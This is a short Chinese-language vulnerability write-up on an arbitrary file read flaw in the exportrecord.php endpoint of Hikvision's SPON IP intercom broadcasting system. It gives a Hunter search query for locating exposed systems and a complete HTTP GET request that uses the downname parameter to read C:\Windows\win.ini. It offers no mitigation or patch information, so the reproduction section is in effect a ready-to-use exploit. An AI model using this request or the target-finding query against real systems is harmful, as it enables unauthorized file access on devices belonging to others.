# 海康威视SPON IP网络对讲广播系统exportrecord存在任意文件读取漏洞

# 一、漏洞简介
<font style="color:rgba(0, 0, 0, 0.9);">Hikvision Intercom Broadcasting System是中国海康威视（Hikvision）公司的一个对讲广播系统。海康威视SPON IP网络对讲广播系统exportrecord存在任意文件读取漏洞。</font>

# <font style="color:rgba(0, 0, 0, 0.9);">二、影响版本</font>
+ 海康威视SPON IP网络对讲广播系统

# 三、资产测绘
+ Hunter：`web.body="vendors/custom/html5.min.js"`
+ 特征

![1704857140903-8dadddb1-8d90-42a6-9179-3cd4dca00c8b.png](./img/Yd53WVvuLyYlHyQc/1704857140903-8dadddb1-8d90-42a6-9179-3cd4dca00c8b-424515.png)

# 四、漏洞复现
```java
GET /php/exportrecord.php?downtype=10&downname=C:\\Windows\\win.ini HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1
```

![1704870941456-ccd140a6-371b-419f-b1a9-f0bd3dfee005.png](./img/Yd53WVvuLyYlHyQc/1704870941456-ccd140a6-371b-419f-b1a9-f0bd3dfee005-744555.png)



> 更新: 2024-02-29 23:57:17  
> 原文: <https://www.yuque.com/xiaokp7/ocvun2/ik7ee4of0gu8yk8n>